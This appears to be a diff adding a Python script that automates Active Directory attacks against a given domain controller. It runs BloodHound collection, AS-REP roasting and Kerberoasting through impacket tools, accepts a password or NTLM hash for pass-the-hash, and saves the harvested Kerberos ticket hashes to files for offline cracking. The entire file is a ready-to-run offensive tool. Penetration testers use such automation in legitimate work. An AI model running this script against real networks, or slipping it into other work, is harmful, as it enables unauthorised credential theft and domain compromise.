@@ -1,0 +1,100 @@
+#!/usr/bin/env python3
+
+import sys
+import subprocess
+import os
+
+def print_help():
+    print("Usage: ad_enum.py <username> <password_or_hash> <domain> <dc_ip>")
+    print("Automates AD recon: BloodHound, AS-REP roasting, and Kerberoasting.")
+    sys.exit(0)
+
+def is_hash(input_string):
+    """Check if the provided credential is likely a hash."""
+    parts = input_string.split(":")
+    return len(parts) == 2 and all(len(part) == 32 for part in parts)
+
+def run_bloodhound(user, password_or_hash, domain, dc_ip, is_hashed):
+    print("[+] Running BloodHound collection...")
+    cmd = [
+        "bloodhound-python",
+        "-u", user,
+        "-d", domain,
+        "-dc", dc_ip,
+        "-c", "all"
+    ]
+    if is_hashed:
+        cmd += ["--hashes", password_or_hash]
+    else:
+        cmd += ["-p", password_or_hash]
+
+    subprocess.run(cmd)
+
+def run_asrep_roast(domain, user, password_or_hash, dc_ip, is_hashed):
+    print("[+] Running AS-REP Roasting...")
+    outfile = f"asrep_{domain}.txt"
+    if is_hashed:
+        cmd = [
+            "impacket-GetNPUsers",
+            f"{domain}/{user}",
+            "--hashes", password_or_hash,
+            "-dc-ip", dc_ip,
+            "-request",
+            "-outputfile", outfile
+        ]
+    else:
+        cmd = [
+            "impacket-GetNPUsers",
+            f"{domain}/{user}:{password_or_hash}",
+            "-dc-ip", dc_ip,
+            "-request",
+            "-outputfile", outfile
+        ]
+    subprocess.run(cmd)
+
+def run_kerberoast(domain, user, password_or_hash, dc_ip, is_hashed):
+    print("[+] Running Kerberoasting...")
+    outfile = f"kerberoast_{domain}.txt"
+    if is_hashed:
+        cmd = [
+            "impacket-GetUserSPNs",
+            f"{domain}/{user}",
+            "--hashes", password_or_hash,
+            "-dc-ip", dc_ip,
+            "-outputfile", outfile
+        ]
+    else:
+        cmd = [
+            "impacket-GetUserSPNs",
+            f"{domain}/{user}:{password_or_hash}",
+            "-dc-ip", dc_ip,
+            "-outputfile", outfile
+        ]
+    subprocess.run(cmd)
+
+
+args = sys.argv[1:]
+
+if not args or args[0] in ("-h", "--help"):
+    print_help()
+
+if len(args) != 4:
+    print("[-] Error: Missing arguments.")
+    print_help()
+
+user, password_or_hash, domain, dc_ip = args
+hashed = is_hash(password_or_hash)
+
+
+run_bloodhound(user, password_or_hash, domain, dc_ip, hashed)
+run_asrep_roast(domain, user, password_or_hash, dc_ip, hashed)
+run_kerberoast(domain, user, password_or_hash, dc_ip, hashed)
+
+
+bh_folder = os.path.expanduser("~/bloodhound-python-output")
+if os.path.isdir(bh_folder):
+    print(f"[+] BloodHound data saved in {bh_folder}")
+    subprocess.run(["xdg-open", bh_folder])
+else:
+    print("[!] Could not find BloodHound output folder.")
+
